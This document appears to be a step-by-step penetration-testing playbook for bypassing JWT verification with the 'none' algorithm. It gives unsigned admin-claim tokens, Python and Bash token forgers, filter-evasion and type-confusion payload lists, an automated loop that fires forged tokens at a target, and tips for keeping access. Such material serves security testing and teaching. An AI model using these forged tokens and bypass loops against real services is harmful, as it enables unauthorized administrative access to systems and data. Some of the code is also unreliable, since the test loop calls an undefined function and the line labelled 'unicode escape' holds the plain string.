# JWT — `none` Algorithm Bypass

## When this applies

- JWT verification library accepts tokens with `alg: none` as unsigned-but-valid.
- Common with libraries that have `alg` whitelist disabled, or where the verification function takes the algorithm from the token itself rather than the configured key type.

## Technique

A JWT with `{"alg":"none"}` declares no signature. Lazy verifiers skip the cryptographic check and trust the payload. Replace the original signed token with an unsigned one carrying admin claims.

## Steps

### 1. Construct an unsigned token

Header:
```json
{"alg":"none","typ":"JWT"}
```

Payload (modify as needed):
```json
{"sub":"admin","role":"administrator","exp":9999999999}
```

Concatenate Base64URL-encoded header + payload + empty signature with TRAILING DOT:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
```

### 2. Python generation

```python
import base64, json

def create_none_token(payload):
    header = {"alg": "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    return f"{h}.{p}."

token = create_none_token({"sub": "admin", "role": "administrator"})
```

### 3. Bash one-liner

```bash
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=' \
  && echo -n '.' \
  && echo -n '{"sub":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=' \
  && echo '.'
```

### 4. Algorithm-name filter bypass

If `none` (lowercase) is filtered, try variations — many filters use case-sensitive string equality:

```json
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":"NoNe"}
{"alg":" none"}
{"alg":"none "}
{"alg":"\tnone"}
{"alg":"none\r\n"}
{"alg":"none"}     // unicode escape
{"alg":"no\x00ne"}      // null byte
```

### 5. Type-confusion bypass

Some parsers compare with `==` (loose equality):
```json
{"alg":null}
{"alg":0}
{"alg":false}
{"alg":""}
{"alg":[]}
{"alg":{}}
{"alg":["none"]}
{"alg":{"value":"none"}}
```

### 6. Trailing-dot variations

Different libraries handle the empty signature differently:

```
eyJhbGc...eyJzdWIi...        # no trailing dot
eyJhbGc...eyJzdWIi.          # one dot, no signature
eyJhbGc...eyJzdWIi.<empty>   # explicit empty after dot
```

Try all three.

### 7. Automated test loop

```python
NONE_VARIATIONS = ["none", "None", "NONE", "nOnE", " none", "none ",
                   "no\x00ne", "\\u006eone", "null", "NULL", "", "0"]

def test_none_variations(target_url, payload):
    for variation in NONE_VARIATIONS:
        header = {"alg": variation, "typ": "JWT"}
        token = create_unsigned_token(header, payload)
        r = requests.get(target_url,
                         headers={'Authorization': f'Bearer {token}'})
        if r.status_code == 200:
            print(f"[+] Accepted variation: {repr(variation)}")
            return token
```

### 8. jwt_tool

```bash
python3 jwt_tool.py JWT -X a
```

`-X a` runs all algorithm-confusion attacks including `none`-variations.

## Verifying success

- A request with the unsigned token returns 200 (not 401/403).
- The response reflects the elevated privilege (e.g. admin endpoint accessible).
- Decoding the token at `jwt.io` shows "Invalid signature" but the application still trusts it.

## Common pitfalls

- Modern libraries (jjwt 0.10+, jose, PyJWT 2.x) reject `alg:none` by default — only legacy or misconfigured deployments accept it.
- Some libraries enforce algorithm match against a configured key type (HS256, RS256) — `none` is rejected because it doesn't match.
- The trailing dot is mandatory in some libraries; absent in others. If the first variant fails, try with/without.
- Empty signature must encode as zero-length Base64URL, not as `""` literal.
- Once authenticated, sessions may rotate the token — capture the new one if you need to maintain access.

## Tools

- jwt_tool (`-X a`).
- Burp Suite JWT Editor extension (set alg to none in the Repeater tab).
- Custom Python (test all variations programmatically).
